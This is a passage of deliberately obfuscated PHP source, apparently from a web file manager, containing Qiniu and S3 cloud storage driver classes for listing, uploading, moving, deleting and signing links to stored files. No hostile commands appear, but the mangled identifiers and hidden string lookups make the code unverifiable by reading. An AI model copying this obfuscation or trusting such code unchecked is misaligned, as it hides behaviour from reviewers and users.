return; } if (!AuthModel::authCheckRoot($¤ô¶„Òˆ[$Ÿö¾¤ä‹[422]][$Ÿö¾¤ä‹[423]])) { return; } $€äÊª¬Ê = $¤ô¶„Òˆ[$Ÿö¾¤ä‹[514]] . $Ÿö¾¤ä‹[22]; if ($€äÊª¬Ê == $Ÿö¾¤ä‹[98]) { unset($ªå—‹Ó¿[$Ÿö¾¤ä‹[599]]); $ªå—‹Ó¿[$Ÿö¾¤ä‹[420]] = self::TYPE_GROUP; return; } $­·©ùšñ = Model($Ÿö¾¤ä‹[531])->groupChildrenAll($€äÊª¬Ê); $›Œ›åòÑ = count($­·©ùšñ); if ($›Œ›åòÑ <= 1) { return; } $ÒÌëúöÅ = array($Ÿö¾¤ä‹[441] => 0, $Ÿö¾¤ä‹[420] => self::TYPE_GROUP, $Ÿö¾¤ä‹[514] => array($Ÿö¾¤ä‹[17], $­·©ùšñ)); $•˜÷Ş›é = $this->field($Ÿö¾¤ä‹[2116])->where($ÒÌëúöÅ)->limit($›Œ›åòÑ)->select(); $ªå—‹Ó¿[$Ÿö¾¤ä‹[599]] = array(); foreach ($•˜÷Ş›é as $êŞ±ÊÚÚ) { $ªå—‹Ó¿[$Ÿö¾¤ä‹[599]][] = array($Ÿö¾¤ä‹[559], $Ÿö¾¤ä‹[540] . $êŞ±ÊÚÚ[$Ÿö¾¤ä‹[411]] . $Ÿö¾¤ä‹[560]); } $ªå—‹Ó¿[$Ÿö¾¤ä‹[599]][] = $Ÿö¾¤ä‹[1947]; } } goto BÏ§ÆÈÉ; e•áº‹ÆÑ”: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($åÃĞòí¥) { parent::__construct(); require_once SDK_DIR . $_SERVER[¹Û¹Æ€][1431]; $this->_init($åÃĞòí¥); } public function _init($èŞå·ÜÌ) { $è ÉºšÕ =& $_SERVER[¹Û¹Æ€]; foreach ($èŞå·ÜÌ as $•İ¶É¹Œ => $ñ´÷¿û) { if (isset($this->{$•İ¶É¹Œ})) { $this->{$•İ¶É¹Œ} = $ñ´÷¿û; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($è ÉºšÕ[1432] . LNG($è ÉºšÕ[1390])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($‡²Ø©Õë, $şıÌìÈ = '', $Š–ÀòåÏ = REPEAT_RENAME) { if ($this->setContent($‡²Ø©Õë, $şıÌìÈ)) { return $this->getPathOuter($‡²Ø©Õë); } return !1; } public function mkdir($­‘ô›Íñ, $»Ü›õÎ÷ = REPEAT_SKIP) { $Šõºæ‰Ë =& $_SERVER[¹Û¹Æ€]; $±Ø…ïğì = trim($­‘ô›Íñ, $Šõºæ‰Ë[18]); if ($this->_isFolder($±Ø…ïğì)) { return $this->getPathOuter($±Ø…ïğì); } $­‘ô›Íñ = $±Ø…ïğì . $Šõºæ‰Ë[18]; $†óä¸™ = get_path_this($±Ø…ïğì); $°úš…š¿ = $­‘ô›Íñ . $†óä¸™; if (!$this->mkfile($°úš…š¿)) { return !1; } if (!$this->moveFile($°úš…š¿, $­‘ô›Íñ)) { $this->delFile($°úš…š¿); return !1; } return $this->getPathOuter($±Ø…ïğì); } public function copyFile($ë°‘ÕÛÓ, $´çİİØ«) { $·ÃÀÂòŞ = $this->bucketManager->copy($this->bucket, $ë°‘ÕÛÓ, $this->bucket, $´çİİØ«, !0); return $·ÃÀÂòŞ ? !1 : $this->getPathOuter($´çİİØ«); } public function moveFile($¨“êòÁÚ, $ÜöÆ—û) { $Ğ¹£ø“ = $this->bucketManager->move($this->bucket, $¨“êòÁÚ, $this->bucket, $ÜöÆ—û, !0); return $Ğ¹£ø“ ? !1 : $this->getPathOuter($ÜöÆ—û); } public function delFile($£›ÒÔ³µ) { if (!$this->exist($£›ÒÔ³µ)) { return !0; } $çëÜÙö = $this->bucketManager->delete($this->bucket, $£›ÒÔ³µ); return $çëÜÙö ? !1 : !0; } public function delFolder($“’û“ş–) { $¢ÒÌØâ =& $_SERVER[¹Û¹Æ€]; if (!$this->exist($“’û“ş–)) { return !0; } $this->listItemCache = !1; $ôºª—â = $this->fileList($“’û“ş–); $this->listItemCache = !0; $òáã‰† = trim($“’û“ş–, $¢ÒÌØâ[18]) . $¢ÒÌØâ[18]; if (!empty($“’û“ş–) && $“’û“ş– !== $¢ÒÌØâ[207] && !in_array($òáã‰†, $ôºª—â[$¢ÒÌØâ[92]])) { $ôºª—â[$¢ÒÌØâ[92]][] = $òáã‰†; } $æ‰Ûñ “ = $this->delByBatch($ôºª—â[$¢ÒÌØâ[93]]); if (!$æ‰Ûñ “) { return !1; } $æ‰Ûñ “ = $this->delByBatch($ôºª—â[$¢ÒÌØâ[92]]); if (!$æ‰Ûñ “) { return !1; } return $this->delFile($òáã‰†); } private function delByBatch($çş¥’²°) { foreach (array_chunk($çş¥’²°, 1000) as $ÍÌºŞãğ) { $ß­Ú•½ = $this->bucketManager->buildBatchDelete($this->bucket, $ÍÌºŞãğ); list($‚Ğ¿¹Œ×, $€îü¬½) = $this->bucketManager->batch($ß­Ú•½); if ($€îü¬½) { return !1; } } return !0; } public function rename($»¿¨íá¹, $§¢ë®â¿) { return $this->renameObject($»¿¨íá¹, $§¢ë®â¿); } public function fileInfo($Âè·¥œÔ, $¢õ„ÍÙá = false, $¥µñëÇŸ = array()) { $šÚ§åÖÔ =& $_SERVER[¹Û¹Æ€]; $¬Ù°çÂ = array($šÚ§åÖÔ[42] => $this->pathThis($Âè·¥œÔ), $šÚ§åÖÔ[94] => $this->getPathOuter($šÚ§åÖÔ[18] . $Âè·¥œÔ), $šÚ§åÖÔ[43] => $šÚ§åÖÔ[209], $šÚ§åÖÔ[86] => isset($¥µñëÇŸ[$šÚ§åÖÔ[1433]]) ? $¥µñëÇŸ[$šÚ§åÖÔ[1433]] : 0, $šÚ§åÖÔ[184] => $this->ext($Âè·¥œÔ)); if ($¢õ„ÍÙá) { return $¬Ù°çÂ; } $¬Ù°çÂ[$šÚ§åÖÔ[210]] = $¬Ù°çÂ[$šÚ§åÖÔ[95]] = 0; $¬Ù°çÂ[$šÚ§åÖÔ[211]] = $¬Ù°çÂ[$šÚ§åÖÔ[212]] = !0; if (empty($¥µñëÇŸ)) { $¥µñëÇŸ = $this->objectMeta($Âè·¥œÔ); if (!$¥µñëÇŸ) { return $¬Ù°çÂ; } } if (isset($¥µñëÇŸ[$šÚ§åÖÔ[1434]])) { $¬Ù°çÂ[$šÚ§åÖÔ[95]] = substr($¥µñëÇŸ[$šÚ§åÖÔ[1434]] . $šÚ§åÖÔ[22], 0, 10); } if (isset($¥µñëÇŸ[$šÚ§åÖÔ[1433]])) { $¬Ù°çÂ[$šÚ§åÖÔ[86]] = $¥µñëÇŸ[$šÚ§åÖÔ[1433]]; } return $¬Ù°çÂ; } public function folderInfo($³£É¨¾›, $—¬ì×ì¢ = false) { $†‘¸ğÖµ =& $_SERVER[¹Û¹Æ€]; $‚””–úÈ = array($†‘¸ğÖµ[42] => $this->pathThis($³£É¨¾›), $†‘¸ğÖµ[94] => $this->getPathOuter($†‘¸ğÖµ[18] . $³£É¨¾›), $†‘¸ğÖµ[43] => $†‘¸ğÖµ[85]); if ($—¬ì×ì¢) { return $‚””–úÈ; } $‚””–úÈ[$†‘¸ğÖµ[210]] = $‚””–úÈ[$†‘¸ğÖµ[95]] = 0; $‚””–úÈ[$†‘¸ğÖµ[211]] = $‚””–úÈ[$†‘¸ğÖµ[212]] = !0; $³£É¨¾› = rtrim($³£É¨¾›, $†‘¸ğÖµ[18]) . $†‘¸ğÖµ[18]; $ëÉï–™Ç = $this->objectMeta($³£É¨¾›); if (isset($ëÉï–™Ç[$†‘¸ğÖµ[1434]])) { $‚””–úÈ[$†‘¸ğÖµ[95]] = substr($ëÉï–™Ç[$†‘¸ğÖµ[1434]] . $†‘¸ğÖµ[22], 0, 10); } return $‚””–úÈ; } public function listPath($¡Í€Ğ„, $İç”ØÔÒ = false) { $÷¶Ï„Ê =& $_SERVER[¹Û¹Æ€]; $ÃİÃ™Ìá = $this->fileList($¡Í€Ğ„, $÷¶Ï„Ê[18], !0); foreach ($ÃİÃ™Ìá[$÷¶Ï„Ê[92]] as $Á•¸ïÕÔ => $©†Í©¹) { $ÃİÃ™Ìá[$÷¶Ï„Ê[92]][$Á•¸ïÕÔ] = $this->folderInfo($©†Í©¹, $İç”ØÔÒ); } foreach ($ÃİÃ™Ìá[$÷¶Ï„Ê[93]] as $Á•¸ïÕÔ => $©†Í©¹) { $ÃİÃ™Ìá[$÷¶Ï„Ê[93]][$Á•¸ïÕÔ] = $this->fileInfo($©†Í©¹[$÷¶Ï„Ê[104]], $İç”ØÔÒ, $©†Í©¹); } return $ÃİÃ™Ìá; } public function has($ö²›°±à, $îÑñæ£  = false, $‚•ö ß = true) { $±®õš©É =& $_SERVER[¹Û¹Æ€]; $ö²›°±à = trim($ö²›°±à, $±®õš©É[18]); $ŒªÜ„™… = empty($ö²›°±à) && $ö²›°±à !== $±®õš©É[207] ? $±®õš©É[22] : $ö²›°±à . $±®õš©É[18]; $İª†¡†• = $±®õš©É[22]; $‘–†º–İ = 500; $¶ÅêÊù = $±®õš©É[18]; $¥±ÕÀùî = $İğÕóÒæ = 0; while (!0) { check_abort(); list($Ç˜Íæ¾ó, $¢šë¿†ß) = $this->bucketManager->listFiles($this->bucket, $ŒªÜ„™…, $İª†¡†•, $‘–†º–İ, $¶ÅêÊù); if ($¢šë¿†ß) { break; } $İª†¡†• = array_key_exists($±®õš©É[1402], $Ç˜Íæ¾ó) ? $İª†¡†• = $Ç˜Íæ¾ó[$±®õš©É[1435]] : $±®õš©É[22]; if ($îÑñæ£ ) { if (!empty($Ç˜Íæ¾ó[$±®õš©É[1436]])) { $¥±ÕÀùî += count($Ç˜Íæ¾ó[$±®õš©É[1436]]); } if (!empty($Ç˜Íæ¾ó[$±®õš©É[1437]])) { $İğÕóÒæ += count($Ç˜Íæ¾ó[$±®õš©É[1437]]); } if ($İª†¡†• === $±®õš©É[22]) { break; } continue; } if ($‚•ö ß) { if (!empty($Ç˜Íæ¾ó[$±®õš©É[1436]])) { return !0; } } else { if (!empty($Ç˜Íæ¾ó[$±®õš©É[1437]])) { return !0; } } if ($İª†¡†• === $±®õš©É[22]) { break; } } if ($îÑñæ£ ) { return array($±®õš©É[217] => $¥±ÕÀùî, $±®õš©É[218] => $İğÕóÒæ); } return !1; } public function listAll($‘³ìŠ˜³) { $øˆÇå¿Ô =& $_SERVER[¹Û¹Æ€]; $í˜¯—Ù  = $this->fileList($‘³ìŠ˜³, $øˆÇå¿Ô[22], !0); $Í‚÷íŸ = array(); foreach ($í˜¯—Ù [$øˆÇå¿Ô[93]] as $­¡æ”Îè) { $Í‚÷íŸ[$­¡æ”Îè[$øˆÇå¿Ô[104]]] = $­¡æ”Îè[$øˆÇå¿Ô[86]]; } foreach ($í˜¯—Ù [$øˆÇå¿Ô[92]] as $­¡æ”Îè) { if (is_string($­¡æ”Îè)) { $Í‚÷íŸ[$­¡æ”Îè] = 0; } } return $this->listAllFiles($‘³ìŠ˜³, array_keys($Í‚÷íŸ), $Í‚÷íŸ); } private function fileList($µñæÈÏ–, $´³ÊÂ¡‡ = '', $â¬ñş”À = 0) { $úïÙĞÄÍ =& $_SERVER[¹Û¹Æ€]; $µñæÈÏ– = trim($µñæÈÏ–, $úïÙĞÄÍ[18]); $Ë™éú„² = empty($µñæÈÏ–) && $µñæÈÏ– !== $úïÙĞÄÍ[207] ? $úïÙĞÄÍ[22] : $µñæÈÏ– . $úïÙĞÄÍ[18]; $îÍòÑğŒ = $úïÙĞÄÍ[22]; $©ŸÀÌ€Ş = 1000; $òáŒªö = $¨é“Œ§‰ = array(); while (!0) { check_abort(); list($ê‡°¥Ä, $ÑÁ§¢÷Ó) = $this->bucketManager->listFiles($this->bucket, $Ë™éú„², $îÍòÑğŒ, $©ŸÀÌ€Ş, $´³ÊÂ¡‡); if ($ÑÁ§¢÷Ó) { break; } $îÍòÑğŒ = array_key_exists($úïÙĞÄÍ[1402], $ê‡°¥Ä) ? $îÍòÑğŒ = $ê‡°¥Ä[$úïÙĞÄÍ[1435]] : $úïÙĞÄÍ[22]; $ĞÈÊÅÃÆ = isset($ê‡°¥Ä[$úïÙĞÄÍ[1436]]) ? $ê‡°¥Ä[$úïÙĞÄÍ[1436]] : array(); $™ÑÍœÌà = isset($ê‡°¥Ä[$úïÙĞÄÍ[1437]]) ? $ê‡°¥Ä[$úïÙĞÄÍ[1437]] : array(); foreach ($ĞÈÊÅÃÆ as $İ¨òº­Ñ) { if ($İ¨òº­Ñ[$úïÙĞÄÍ[104]] == $Ë™éú„²) { continue; } $Ñ­ğªÉİ = $İ¨òº­Ñ[$úïÙĞÄÍ[104]]; $§û¯ôÂ¦ = $İ¨òº­Ñ[$úïÙĞÄÍ[1433]]; $İ¨òº­Ñ[$úïÙĞÄÍ[86]] = $§û¯ôÂ¦; $øäıÔ€õ = $§û¯ôÂ¦ == 0 && substr($Ñ­ğªÉİ, strlen($Ñ­ğªÉİ) - 1, 1) == $úïÙĞÄÍ[18] ? !0 : !1; $this->cacheMethodInfoSet($Ñ­ğªÉİ, $øäıÔ€õ, $İ¨òº­Ñ); if ($øäıÔ€õ) { $òáŒªö[] = $Ñ­ğªÉİ; continue; } $¨é“Œ§‰[] = $â¬ñş”À ? $İ¨òº­Ñ : $Ñ­ğªÉİ; } foreach ($™ÑÍœÌà as $Ñ­ğªÉİ) { if ($Ñ­ğªÉİ == $Ë™éú„²) { continue; } $òáŒªö[] = $Ñ­ğªÉİ; $this->cacheMethodInfoSet($Ñ­ğªÉİ, !0); } if ($îÍòÑğŒ === $úïÙĞÄÍ[22]) { break; } } $this->cacheMethodInfoSet($µñæÈÏ–, !0); return array($úïÙĞÄÍ[92] => $òáŒªö, $úïÙĞÄÍ[93] => $¨é“Œ§‰); } public function canRead($ı¯ı™Ÿ„) { return $this->exist($ı¯ı™Ÿ„) ? !0 : !1; } public function canWrite($‰ë¸ÖÉƒ) { return $this->exist($‰ë¸ÖÉƒ) ? !0 : !1; } public function getContent($¢ôšÔ ä) { return $this->fileSubstr($¢ôšÔ ä, 0, -1); } public function setContent($’Æ¢¯à¶, $Ğ…Á“€ = '') { $ÆŞœÕÜ = $this->tempFile($this->pathThis($’Æ¢¯à¶)); file_put_contents($ÆŞœÕÜ, $Ğ…Á“€); if ($this->upload($’Æ¢¯à¶, $ÆŞœÕÜ)) { $this->tempFileRemve($ÆŞœÕÜ); return !0; } return !1; } public function refreshUrls($”êÀí) { $ïûÄÔ– =& $_SERVER[¹Û¹Æ€]; $›½ùØ¡¿ = array(); if (is_array($”êÀí)) { foreach ($”êÀí as $ÌÙ¾ï) { $›½ùØ¡¿[] = $this->link($ÌÙ¾ï); } } else { $›½ùØ¡¿[] = $this->link($”êÀí); } $¿ÉÜìÒ€ = new Qiniu\Cdn\CdnManager($this->auth); list($µÏ´°š¿, $ÅøÇÒ†ô) = $¿ÉÜìÒ€->refreshUrls($›½ùØ¡¿); if ($ÅøÇÒ†ô) { return !1; } return $µÏ´°š¿[$ïûÄÔ–[1180]] == $ïûÄÔ–[758] ? !0 : !1; } public function fileSubstr($Â­ƒïÃ, $ëÉâòä¹, $·¢£ÔË±) { $«ûØĞ“á =& $_SERVER[¹Û¹Æ€]; if (!($øÖ¥ìÊğ = $this->link($Â­ƒïÃ))) { return !1; } $ùŸ‘¬Éş = !1; if ($·¢£ÔË± > 0) { $ĞÜ˜•À = $ëÉâòä¹ + $·¢£ÔË± - 1; $ùŸ‘¬Éş = array($«ûØĞ“á[1438] . $ëÉâòä¹ . $«ûØĞ“á[395] . $ĞÜ˜•À); } $â”ŞÅ = url_request($øÖ¥ìÊğ, $«ûØĞ“á[240], !1, $ùŸ‘¬Éş); return $â”ŞÅ[$«ûØĞ“á[748]] ? $â”ŞÅ[$«ûØĞ“á[1200]] : !1; } public function upload($÷êÓ‡§ , $ô½»…í¢, $£…Û£ï = false, $¿¶à÷× = REPEAT_REPLACE) { $ğĞòòş = new Qiniu\Storage\UploadManager(); $ØÕ²ª“ = $this->auth->uploadToken($this->bucket, $÷êÓ‡§ ); $Ó«Ç°²Î = get_file_mime(get_path_ext($ô½»…í¢)); list($“ÛçĞé¿, $á¤¬¬úö) = $ğĞòòş->putFile($ØÕ²ª“, $÷êÓ‡§ , $ô½»…í¢, null, $Ó«Ç°²Î); return $á¤¬¬úö ? !1 : $this->getPathOuter($÷êÓ‡§ ); } public function uploadFormData($›˜³ÄÇª, $ôÎÓ™õä = 3600) { return $this->uploadToken($›˜³ÄÇª, $ôÎÓ™õä); } public function multiUploadFormData($¨ÙÁÁ¥÷, $¯òÑèó = 3600) { return $this->uploadToken($¨ÙÁÁ¥÷, $¯òÑèó); } private function uploadToken($ŞŞöõœê, $‘š¹±¸ = 3600) { $¼«Ê÷©ª =& $_SERVER[¹Û¹Æ€]; $ÕşÑ£à = $‘š¹±¸; $ªı©íóÓ = array($¼«Ê÷©ª[1439] => $¼«Ê÷©ª[1440]); $ÒÂ®¸¦Í = $ŞŞöõœê; $Åºà‰Ëâ = $this->auth->uploadToken($this->bucket, $ÒÂ®¸¦Í, $ÕşÑ£à, $ªı©íóÓ, !0); $‡©œĞŠÏ = empty($this->region) || $this->region == $¼«Ê÷©ª[1441] ? $¼«Ê÷©ª[22] : $¼«Ê÷©ª[395] . $this->region; $ÀÓíòŸï = http_type() . "\72\x2f\57\x75\x70\154\x6f\x61\x64{$‡©œĞŠÏ}\56\161\x69\156\x69\165\x70\x2e\x63\x6f\155\57"; return array($¼«Ê÷©ª[1442] => $Åºà‰Ëâ, $¼«Ê÷©ª[1443] => $ÀÓíòŸï); } public function download($ğË“ü™ğ, $€Áç¯£¼) { $¥§¼Óô‹ = IO::getPathInner(IO::mkfile($€Áç¯£¼)); if (!($ÇâÛäªá = $this->link($ğË“ü™ğ))) { return !1; } $ˆÕ‡İ¨¿ = 0; $š¯ö·óÅ = 1024 * 200; $œå”‘¤ = fopen($¥§¼Óô‹, $_SERVER[¹Û¹Æ€][1444]); while (!0) { $Ç”‡ñŒâ = $this->fileSubstr($ğË“ü™ğ, $ˆÕ‡İ¨¿, $š¯ö·óÅ); if ($Ç”‡ñŒâ === !1) { return !1; } fwrite($œå”‘¤, $Ç”‡ñŒâ); $ˆÕ‡İ¨¿ += $š¯ö·óÅ; if (strlen($Ç”‡ñŒâ) < $š¯ö·óÅ) { break; } } fclose($œå”‘¤); return $€Áç¯£¼; } public function link($úâŸ¢·×, $õ»‚â¹« = '') { if (!$this->isFile($úâŸ¢·×)) { return !1; } $ˆôÊğ• = $this->getHost() . $_SERVER[¹Û¹Æ€][18] . $this->pathEncode($úâŸ¢·×) . $õ»‚â¹«; return $this->auth->privateDownloadUrl($ˆôÊğ•, 3600 * 12); } public function fileOut($¾»×äë, $¯š¡®õÛ = false, $Â±Ú—•” = false, $ä±–Æ£ù = '') { $ğì×§ß¶ =& $_SERVER[¹Û¹Æ€]; if ($this->isFileOutServer()) { return $this->fileOutServer($¾»×äë, $¯š¡®õÛ, $Â±Ú—•”, $ä±–Æ£ù); } if (!$Â±Ú—•”) { $Â±Ú—•” = $this->pathThis($¾»×äë); } $Àè¥êÊ• = $¯š¡®õÛ ? $ğì×§ß¶[1445] . rawurlencode($Â±Ú—•”) : $ğì×§ß¶[22]; $ğı§‘Û = $this->link($¾»×äë, $Àè¥êÊ•); $this->fileOutLink($ğı§‘Û); } public function fileOutServer($ò·İ‰€¥, $÷ó”ï = false, $…Ã™¶“ä = false, $¯¿è‘ = '') { parent::fileOut($ò·İ‰€¥, $÷ó”ï, $…Ã™¶“ä, $¯¿è‘); } public function fileOutImage($È†ÔëÃ, $×ì¯‰Ô£ = 250) { $ßåÆ…¡Ğ = $this->link($È†ÔëÃ, $_SERVER[¹Û¹Æ€][1446] . $×ì¯‰Ô£); $this->fileOutLink($ßåÆ…¡Ğ); } public function fileOutImageServer($õˆÎ¹, $ˆĞÅøÆÁ = 250) { parent::fileOutImage($õˆÎ¹, $ˆĞÅøÆÁ); } public function hashMd5($ı©–Ã‹) { $åçôÂòÃ =& $_SERVER[¹Û¹Æ€]; $È¿â¯£¡ = $this->objectMeta($ı©–Ã‹); return isset($È¿â¯£¡[$åçôÂòÃ[222]]) ? $È¿â¯£¡[$åçôÂòÃ[222]] : !1; $üÚá·„¤ = $this->link($ı©–Ã‹, $åçôÂòÃ[1447]); } public function size($âˆ•…Ì) { $ú£·¢Ù‰ = $this->objectMeta($âˆ•…Ì); return $ú£·¢Ù‰ ? $ú£·¢Ù‰[$_SERVER[¹Û¹Æ€][86]] : 0; } public function info($£üğŞ†š) { if ($this->isFolder($£üğŞ†š)) { return $this->folderInfo($£üğŞ†š); } else { if ($this->isFile($£üğŞ†š)) { return $this->fileInfo($£üğŞ†š); } } return !1; } public function exist($âÚÅ÷Ç…) { return $this->isFile($âÚÅ÷Ç…) || $this->isFolder($âÚÅ÷Ç…); } public function isFile($‰©Œ÷‹ˆ) { return !$this->isFolder($‰©Œ÷‹ˆ) && $this->objectMeta($‰©Œ÷‹ˆ); } public function isFolder($¾İÆİÔ´) { return $this->cacheMethod($_SERVER[¹Û¹Æ€][175], $¾İÆİÔ´); } protected function objectMeta($£ùºô¦¡) { return $this->cacheMethod($_SERVER[¹Û¹Æ€][177], $£ùºô¦¡); } protected function _objectMeta($“òíÕ”) { $ÛÑ´³Š =& $_SERVER[¹Û¹Æ€]; list($ã†ğüä, $°°£©Ì) = $this->bucketManager->stat($this->bucket, $“òíÕ”); if ($ã†ğüä) { $ã†ğüä[$ÛÑ´³Š[86]] = intval($ã†ğüä[$ÛÑ´³Š[1433]]); } return $ã†ğüä; } protected function _isFolder($ûé…¦€’) { $çòùÀá· =& $_SERVER[¹Û¹Æ€]; if ($ûé…¦€’ == $çòùÀá·[22] || $ûé…¦€’ == $çòùÀá·[18]) { return !0; } list($šñË‘¿¦, $©ø×µÌÑ) = $this->bucketManager->listFiles($this->bucket, trim($ûé…¦€’, $çòùÀá·[18]) . $çòùÀá·[18], $çòùÀá·[22], 1, $çòùÀá·[18]); return !empty($šñË‘¿¦[$çòùÀá·[1436]]) || !empty($šñË‘¿¦[$çòùÀá·[1437]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Ÿ Ë¢Ï£) { parent::__construct($Ÿ Ë¢Ï£); } public function uploadFormData($³øğ¿è, $àÃÁé® = 3600) { $ıÑ°øüŞ =& $_SERVER[¹Û¹Æ€]; $´ŠóË = $ıÑ°øüŞ[208]; $ª¢ı«êÄ = $ıÑ°øüŞ[1352]; $ñ„æ“Ö¸ = $ıÑ°øüŞ[72]; $å°£˜ïæ = gmdate($ıÑ°øüŞ[1353]); $ä”ÏÆŞù = gmdate($ıÑ°øüŞ[749]); $ˆü›ş€® = $ıÑ°øüŞ[1354]; $¦í¬æ— = $àÃÁé® . $ıÑ°øüŞ[22]; $Î¼Œû‰Ò = $ıÑ°øüŞ[1316]; $¢¯²™ = array($this->accessKey, $ä”ÏÆŞù, $this->region, $ñ„æ“Ö¸, $ˆü›ş€®); $êˆŒ¼‡‹ = implode($ıÑ°øüŞ[18], $¢¯²™); $«óÂÓ‰Î = array($ıÑ°øüŞ[1318] => gmdate($ıÑ°øüŞ[1317], strtotime($ıÑ°øüŞ[1355])), $ıÑ°øüŞ[1319] => array(array($ıÑ°øüŞ[1321] => $this->bucket), array($ıÑ°øüŞ[1320] => $´ŠóË), array($ıÑ°øüŞ[1322], $ıÑ°øüŞ[1323], $ıÑ°øüŞ[22]), array($ıÑ°øüŞ[1322], $ıÑ°øüŞ[1356], $ıÑ°øüŞ[22]), array($ıÑ°øüŞ[1322], $ıÑ°øüŞ[1357], $ıÑ°øüŞ[22]), array($ıÑ°øüŞ[1324] => $Î¼Œû‰Ò), array($ıÑ°øüŞ[1358] => $êˆŒ¼‡‹), array($ıÑ°øüŞ[1359] => $ª¢ı«êÄ), array($ıÑ°øüŞ[1360] => $å°£˜ïæ), array($ıÑ°øüŞ[1361] => $¦í¬æ—))); $Ñ•ùÆéĞ = base64_encode(json_encode($«óÂÓ‰Î)); $±ƒì¶ìº = hash_hmac($ıÑ°øüŞ[1362], $ä”ÏÆŞù, $ıÑ°øüŞ[1363] . $this->secret, !0); $åÎ¿áİ = hash_hmac($ıÑ°øüŞ[1362], $this->region, $±ƒì¶ìº, !0); $§Âöá¤Ò = hash_hmac($ıÑ°øüŞ[1362], $ñ„æ“Ö¸, $åÎ¿áİ, !0); $ìÀ¶ÌøØ = hash_hmac($ıÑ°øüŞ[1362], $ˆü›ş€®, $§Âöá¤Ò, !0); $íÇìª—Ø = hash_hmac($ıÑ°øüŞ[1362], $Ñ•ùÆéĞ, $ìÀ¶ÌøØ); $İÄå‡Óğ = array($ıÑ°øüŞ[225] => $ıÑ°øüŞ[22], $ıÑ°øüŞ[1364] => $ıÑ°øüŞ[22], $ıÑ°øüŞ[1320] => $´ŠóË, $ıÑ°øüŞ[1324] => $Î¼Œû‰Ò, $ıÑ°øüŞ[1328] => $Ñ•ùÆéĞ, $ıÑ°øüŞ[1365] => $êˆŒ¼‡‹, $ıÑ°øüŞ[1366] => $ª¢ı«êÄ, $ıÑ°øüŞ[1367] => $å°£˜ïæ, $ıÑ°øüŞ[1368] => $¦í¬æ—, $ıÑ°øüŞ[1369] => $íÇìª—Ø, $ıÑ°øüŞ[191] => $this->getHost()); return $İÄå‡Óğ; } public function multiUploadFormData($Î·å°Íì, $³ş¨¾ÍŠ = 3600) { $ì¶—ŸûÏ =& $_SERVER[¹Û¹Æ€]; $­Í½ = gmdate($ì¶—ŸûÏ[1448]); $ÏßşÔŸ = array(); $õæé®­¦ = $this->client->getUploadId($this->bucket, $Î·å°Íì, $ÏßşÔŸ); if (!$õæé®­¦) { return !1; } return array($ì¶—ŸûÏ[233] => $õæé®­¦, $ì¶—ŸûÏ[191] => $this->getHost() . $ì¶—ŸûÏ[18] . $this->pathEncode($Î·å°Íì), $ì¶—ŸûÏ[234] => $­Í½, $ì¶—ŸûÏ[104] => $Î·å°Íì); } public function multiUploadAuthData($‘ØÔ, $èÑ®ÓŸ  = array()) { $ìáŸ¾¥Á =& $_SERVER[¹Û¹Æ€]; $–ŒøÙİ = isset($èÑ®ÓŸ [$ìáŸ¾¥Á[184]]) ? $èÑ®ÓŸ [$ìáŸ¾¥Á[184]] : $ìáŸ¾¥Á[22]; $î–š²Ö = $èÑ®ÓŸ [$ìáŸ¾¥Á[104]]; unset($èÑ®ÓŸ [$ìáŸ¾¥Á[104]]); if (isset($èÑ®ÓŸ [$ìáŸ¾¥Á[235]])) { return $this->listUploadParts($î–š²Ö, $èÑ®ÓŸ ); } $Äñğ¡š = array(); if (isset($èÑ®ÓŸ [$ìáŸ¾¥Á[1449]])) { $Äñğ¡š[$ìáŸ¾¥Á[1450]] = $èÑ®ÓŸ [$ìáŸ¾¥Á[1449]]; } $ˆîòƒ©¼ = explode($ìáŸ¾¥Á[193], $this->getHost()); $À‰ÍøšÎ = array($ìáŸ¾¥Á[1451] => $ˆîòƒ©¼[1], $ìáŸ¾¥Á[1452] => $ìáŸ¾¥Á[22], $ìáŸ¾¥Á[225] => $ìáŸ¾¥Á[130], $ìáŸ¾¥Á[1364] => $èÑ®ÓŸ [$ìáŸ¾¥Á[86]]); $ë“ö«à‚ = $ìáŸ¾¥Á[238]; $ û«Ñ† = $ìáŸ¾¥Á[18] . $this->pathEncode($î–š²Ö) . $–ŒøÙİ; $°óÜ…Æ© = $this->client->__getSignatureV4($Äñğ¡š, $À‰ÍøšÎ, $ë“ö«à‚, $ û«Ñ†); if (strpos($–ŒøÙİ, $ìáŸ¾¥Á[237]) === 0) { if (isset($Äñğ¡š[$ìáŸ¾¥Á[1450]])) { $ŠÙĞ¬ó‰ = $Äñğ¡š[$ìáŸ¾¥Á[1450]]; } else { if (isset($°óÜ…Æ©[$ìáŸ¾¥Á[1450]])) { $ŠÙĞ¬ó‰ = $°óÜ…Æ©[$ìáŸ¾¥Á[1450]]; } else { $ŠÙĞ¬ó‰ = hash($ìáŸ¾¥Á[1362], $ìáŸ¾¥Á[22]); } } return array($ìáŸ¾¥Á[243] => $°óÜ…Æ©[$ìáŸ¾¥Á[243]], $ìáŸ¾¥Á[1450] => $ŠÙĞ¬ó‰, $ìáŸ¾¥Á[234] => $°óÜ…Æ©[$ìáŸ¾¥Á[1453]]); } return $°óÜ…Æ©[$ìáŸ¾¥Á[243]]; } public function listUploadParts($µáŸ¬Ü, $öï›Ù— = array()) { $ÔíÜ¥úë =& $_SERVER[¹Û¹Æ€]; $Ññ§Ôæ = str_replace($ÔíÜ¥úë[244], $ÔíÜ¥úë[22], $öï›Ù—[$ÔíÜ¥úë[184]]); $ŸŠíÄ = $this->client->listParts($this->bucket, $µáŸ¬Ü, $Ññ§Ôæ); if (!$ŸŠíÄ) { return !1; } $ıËãÕ¿¿ = $ÔíÜ¥úë[1454]; foreach ($ŸŠíÄ as $™³àÉ­) { $ıËãÕ¿¿ .= $ÔíÜ¥úë[1455] . 